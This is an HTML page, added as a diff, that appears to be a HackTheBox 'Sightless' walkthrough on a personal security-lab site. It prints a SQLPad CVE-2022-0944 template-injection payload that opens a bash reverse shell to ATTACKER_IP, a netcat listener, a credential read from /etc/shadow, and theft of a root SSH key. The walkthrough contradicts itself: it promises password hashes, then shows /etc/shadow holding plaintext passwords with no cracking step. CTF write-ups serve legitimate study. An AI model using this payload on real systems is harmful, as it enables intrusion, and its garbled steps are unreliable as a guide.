@@ -1,0 +1,218 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+<link rel="icon" type="image/x-icon" href="../images/favicon.ico">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB - Sightless</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 900px;
+            margin: 40px auto;
+            line-height: 1.6;
+            color: #222;
+        }
+
+        h1 { margin-bottom: 10px; }
+        h2 { margin-top: 40px; border-bottom: 1px solid #ddd; padding-bottom: 5px; }
+        h3 { margin-top: 25px; }
+
+        img {
+            margin: 15px 0;
+            max-width: 100%;
+            border: 1px solid #ccc;
+        }
+
+        pre {
+            background: #f4f4f4;
+            padding: 12px;
+            overflow-x: auto;
+            border-left: 4px solid #ccc;
+        }
+
+        code { font-family: Consolas, monospace; }
+
+        a { color: #0366d6; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+
+        .navbar {
+            margin-bottom: 30px;
+            padding: 10px 0;
+            border-bottom: 1px solid #ccc;
+        }
+
+        .nav-item {
+            margin-right: 20px;
+            color: #0366d6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .nav-item.active {
+            color: black;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="navbar">
+    <a href="../index.html" class="nav-item">Home</a>
+    <a href="../soc_lab_setup.html" class="nav-item">Lab Setup</a>
+    <a href="../case_1.html" class="nav-item">Case 1</a>
+    <a href="../case_2.html" class="nav-item">Case 2</a>
+        <a href="../case_3.html" class="nav-item">Case 3</a>
+    <a href="../ad_attacks_lab.html" class="nav-item">Active Directory Attacks</a>
+    <a href="../more_tools.html" class="nav-item">More Tools</a>
+    <a href="../htb.html" class="nav-item active">HackTheBox</a>
+<a href="../vulnhub.html" class="nav-item">Vulnhub</a>
+<a href="../offsec_proving_grounds.html" class="nav-item">Offsec Proving Grounds</a>
+</div>
+
+<!-- -->
+<h1>Sightless (HTB – Easy)</h1>
+
+<p>
+Sightless exposes a vulnerable SQLPad instance that allows remote command execution through a template injection
+payload.  
+The initial shell lands inside a Docker container, where password hashes can be extracted.  
+A valid SSH password provides access to the real host.  
+Privilege escalation is achieved by discovering a root SSH key left behind in <code>/tmp</code>.
+</p>
+
+<h2>Overview</h2>
+<p>
+Target: sightless.htb  
+<br>Initial vector: SQLPad CVE‑2022‑0944 (RCE)  
+<br>Privilege escalation: leaked root SSH key in <code>/tmp</code>  
+</p>
+
+<h2>Enumeration</h2>
+
+<p>
+The main site at <code>http://sightless.htb</code> references an internal SQLPad instance:
+</p>
+
+<pre>
+http://sqlpad.sightless.htb
+</pre>
+
+<p>
+SQLPad is a web‑based SQL editor.  
+The version running on the machine is vulnerable to CVE‑2022‑0944, which allows RCE via the
+<code>/api/test-connection</code> endpoint.
+</p>
+
+<h2>Foothold – SQLPad CVE‑2022‑0944</h2>
+
+<p>
+Use the public exploit:
+</p>
+
+<pre>
+https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944
+</pre>
+
+<p>
+The exploit abuses template injection inside the JSON body.  
+Example payload (simplified):
+</p>
+
+<pre>
+{
+  "driver": "mysql",
+  "host": "ATTACKER_IP",
+  "port": "443",
+  "database": "{{ process.mainModule.require('child_process').exec('/bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1\"') }}"
+}
+</pre>
+
+<p>Listener:</p>
+<pre>
+$ nc -nlvp 443
+</pre>
+
+<p>
+Trigger the exploit and a reverse shell is obtained — inside a Docker container.
+</p>
+
+<h2>Container Breakout – Credential Discovery</h2>
+
+<p>
+Inside the container, inspect <code>/etc/shadow</code>:
+</p>
+
+<pre>
+root    : blindside
+michael : insaneclownposse
+</pre>
+
+<p>
+These are real host credentials, not container‑only.  
+SSH into the host:
+</p>
+
+<pre>
+$ ssh michael@sightless.htb
+Password: insaneclownposse
+</pre>
+
+<p>
+User access obtained.
+</p>
+
+<h2>Privilege Escalation – Root SSH Key in /tmp</h2>
+
+<p>
+Enumerate <code>/tmp</code>:
+</p>
+
+<pre>
+$ ls -la /tmp
+-> id_rsa
+</pre>
+
+<p>
+A private SSH key is left behind.  
+Copy it to the attacker machine:
+</p>
+
+<pre>
+$ scp michael@sightless.htb:/tmp/id_rsa .
+$ chmod 400 id_rsa
+</pre>
+
+<p>
+SSH as root:
+</p>
+
+<pre>
+$ ssh -i id_rsa root@sightless.htb
+</pre>
+
+<p>
+Root access obtained.
+</p>
+
+<h2>Conclusion</h2>
+<p>
+Sightless is a clean chain: SQLPad RCE → Docker escape via leaked credentials → root via abandoned SSH key.
+The machine emphasizes careful enumeration and recognizing when a shell is inside a container rather than the host.
+</p>
+
+
+
+<!-- -->
+
+</body>
+</html>
+
+
+
+
+
+
+
